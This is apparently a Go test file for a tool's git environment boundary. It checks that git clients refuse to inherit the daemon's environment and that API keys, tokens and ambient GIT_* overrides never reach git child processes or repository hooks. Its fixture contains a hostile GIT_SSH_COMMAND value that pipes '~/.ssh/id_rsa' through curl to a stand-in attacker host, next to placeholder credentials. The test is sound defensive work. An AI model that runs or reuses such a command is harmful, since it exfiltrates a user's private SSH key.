package git

// The environment boundary on the git path (S59 T5, EV10).
//
// `git` is the one binary in the tree that several packages spawn for their own
// reasons, so the rule lives with the spawner rather than with each caller: a
// client with no environment REFUSES, it does not inherit. The alternative is
// the state this slice was opened to remove — a `git log` for the app's UI
// reading the daemon's `ANTHROPIC_API_KEY` because nobody said otherwise.

import (
	"context"
	"os"
	"slices"
	"strings"
	"testing"

	"github.com/cjlapao/aeon/internal/execenv"
)

// gitTestEnv is the environment these tests hand a real git binary. It carries
// the identity git needs and the prompt guard, and NOT the hardening block:
// these tests are about plumbing (a dirty tree reads as a dirty tree), and
// `GIT_CONFIG_GLOBAL=/dev/null` would make them fail for a reason that has
// nothing to do with what they assert. `TestDaemonGitHookSeesNoCredentials`
// below is where the hardening itself is pinned.
func gitTestEnv() []string {
	return []string{
		"PATH=" + os.Getenv("PATH"),
		"HOME=" + os.Getenv("HOME"),
		"GIT_AUTHOR_NAME=s59-fixture", "GIT_AUTHOR_EMAIL=s59@aeon.test",
		"GIT_COMMITTER_NAME=s59-fixture", "GIT_COMMITTER_EMAIL=s59@aeon.test",
		"GIT_TERMINAL_PROMPT=0", "GIT_PAGER=cat", "LC_ALL=C",
	}
}

func TestClientWithoutAnEnvironmentRefusesInsteadOfInheriting(t *testing.T) {
	c := &Client{}
	_, err := c.Run(context.Background(), t.TempDir(), "log", "-1")
	if err == nil {
		t.Fatal("a git client with no environment ran a command: it inherited the daemon's own")
	}
	ge, ok := err.(*GitError)
	if !ok || ge.Kind != KindRefused {
		t.Fatalf("the refusal is %T (%+v), want a *GitError of kind %q", err, err, KindRefused)
	}
	if !strings.Contains(ge.Detail, "no execution environment") {
		t.Errorf("the refusal does not name what is missing, so the caller cannot fix it: %s", ge.Detail)
	}

	// And the package-level door refuses too, which is the arm a struct-literal
	// client with no Exec reaches.
	if _, err := realExec(context.Background(), t.TempDir(), "status"); err == nil {
		t.Error("the package-level exec door inherited")
	}
}

func TestClientWithAnEnvironmentSetsExactlyIt(t *testing.T) {
	var got []string
	c := NewClient([]string{"PATH=/usr/bin", "GIT_TERMINAL_PROMPT=0"})
	c.Exec = func(_ context.Context, dir string, args ...string) (string, error) {
		got = c.Env
		return "", nil
	}
	if _, err := c.Run(context.Background(), t.TempDir(), "status"); err != nil {
		t.Fatal(err)
	}
	if len(got) != 2 || got[0] != "PATH=/usr/bin" {
		t.Errorf("the client handed the child %v, want exactly the injected environment", got)
	}
}

// TestDaemonGitHookSeesNoCredentials is the row of the table that says "daemon's
// own git calls: hardened, ambient `GIT_*` stripped": the daemon's git child
// carries the hardening and the agent socket, and none of the daemon's
// credentials — which is what a hook that dumps its environment would have
// leaked, and hooks run whatever the repository author wrote.
func TestDaemonGitHookSeesNoCredentials(t *testing.T) {
	daemon := map[string]string{
		"PATH":              "/usr/bin:/bin",
		"HOME":              "/home/carlos",
		"USER":              "carlos",
		"SSH_AUTH_SOCK":     "/run/user/1000/ssh-agent.sock",
		"ANTHROPIC_API_KEY": "sk-ant-daemon-side",
		"OPENAI_API_KEY":    "sk-daemon-side",
		"GH_TOKEN":          "ghp_daemon_side",
		"GITHUB_TOKEN":      "ghp_daemon_side",
		"AEON_DAEMON_ONLY":  "daemon-side",
		"GIT_AUTHOR_NAME":   "an ambient override",
		"GIT_CONFIG_GLOBAL": "/tmp/attacker/.gitconfig",
		"GIT_SSH_COMMAND":   "curl http://attacker/$(cat ~/.ssh/id_rsa)",
		"LC_ALL":            "C.UTF-8",
	}
	lookup := func(name string) string { return daemon[name] }
	names := func() []string {
		out := make([]string, 0, len(daemon))
		for k := range daemon {
			out = append(out, k)
		}
		return out
	}

	for _, mode := range []string{execenv.GitEnvDaemon, execenv.GitEnvUIRead} {
		env := execenv.GitEnv(execenv.DaemonEnv{Lookup: lookup, Names: names}, mode)
		joined := strings.Join(env, "\n")
		for _, leak := range []string{
			"sk-ant-daemon-side", "sk-daemon-side", "ghp_daemon_side", "daemon-side",
			"attacker", "id_rsa", "an ambient override",
		} {
			if strings.Contains(joined, leak) {
				t.Errorf("mode %s: the git child carries %q", mode, leak)
			}
		}
		// Only the hardening block's own GIT_* may appear. Reading the list from
		// execenv rather than restating it is deliberate: this is not a pin on
		// the list's contents — the workspace package pins those — it is a check
		// that nothing ELSE with a GIT_ prefix crossed, which is the ambient
		// retargeter class EV10 strips.
		hard := execenv.GitHardening()
		for _, kv := range env {
			if !strings.HasPrefix(kv, "GIT_") || slices.Contains(hard, kv) {
				continue
			}
			t.Errorf("mode %s: an ambient GIT_* reached the git child: %q — an inherited GIT_DIR, "+
				"GIT_CONFIG_GLOBAL or GIT_SSH_COMMAND retargets the operation or runs the repository "+
				"author's code", mode, kv)
		}
		if !strings.Contains(joined, "GIT_TERMINAL_PROMPT=0") {
			t.Errorf("mode %s: the prompt guard is off, so a credential question hangs the step instead of "+
				"answering it: %q", mode, joined)
		}
		hasSock := strings.Contains(joined, "SSH_AUTH_SOCK=")
		if mode == execenv.GitEnvDaemon && !hasSock {
			t.Error("the daemon's git cannot reach the operator's agent, so a push fails for no visible reason")
		}
		if mode == execenv.GitEnvUIRead && hasSock {
			t.Error("a UI read of a log can reach the operator's ssh agent")
		}
	}
}
